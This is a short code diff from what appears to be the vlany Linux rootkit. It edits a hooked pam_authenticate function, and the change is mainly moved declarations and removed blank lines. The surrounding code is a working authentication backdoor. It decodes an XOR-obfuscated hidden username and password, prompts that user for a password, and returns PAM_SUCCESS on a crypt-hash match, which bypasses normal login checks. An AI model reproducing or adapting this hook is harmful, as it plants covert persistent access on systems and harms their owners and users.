@@ -4,11 +4,10 @@ int pam_authenticate(pam_handle_t *pamh, int flags)
         printf("[vlany] pam_authenticate() called\n");
     #endif
 
-    void *user;
-
     HOOK(old_pam_authenticate, CPAM_AUTHENTICATE);
+ 
+    void *user;
     pam_get_item(pamh, PAM_USER, (const void **)&user);
-
     if((char *)user == NULL) return old_pam_authenticate(pamh, flags);
 
     char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
@@ -19,13 +18,10 @@ int pam_authenticate(pam_handle_t *pamh, int flags)
 
         char prompt[512], *pw;
         snprintf(prompt, sizeof(prompt), "* Password for %s: ", vlany_user);
-
         pam_prompt(pamh, 1, &pw, "%s", prompt);
 
         char *vlany_password = strdup(VLANY_PASSWORD); xor(vlany_password);
-
         if(!strcmp(crypt(pw, vlany_password), vlany_password)) { CLEAN(vlany_user); CLEAN(vlany_password); return PAM_SUCCESS; }
-
         CLEAN(vlany_user);
         CLEAN(vlany_password);
 
